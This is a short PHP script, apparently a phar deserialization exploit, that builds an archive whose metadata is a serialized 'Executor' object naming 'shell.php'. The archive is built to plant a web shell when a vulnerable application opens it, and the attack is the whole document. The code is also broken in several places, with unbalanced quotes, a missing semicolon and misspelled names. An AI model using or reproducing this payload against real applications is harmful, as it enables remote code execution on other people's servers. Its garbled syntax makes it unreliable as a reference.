<?php
    class Executor {
	private $filename = "shell.php";
	private $signature = "05b5d10138ead0663fc142475e246cd8";
	private $init = false;
    }
    $phar = new Phar(test.phar")
    $phar->startBuffering();
    $phar->addFromString("test.txt", 'test');
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $o = new Executeor();
    $phar->setMetadata($o);
    $pharstopBuffering();
?>
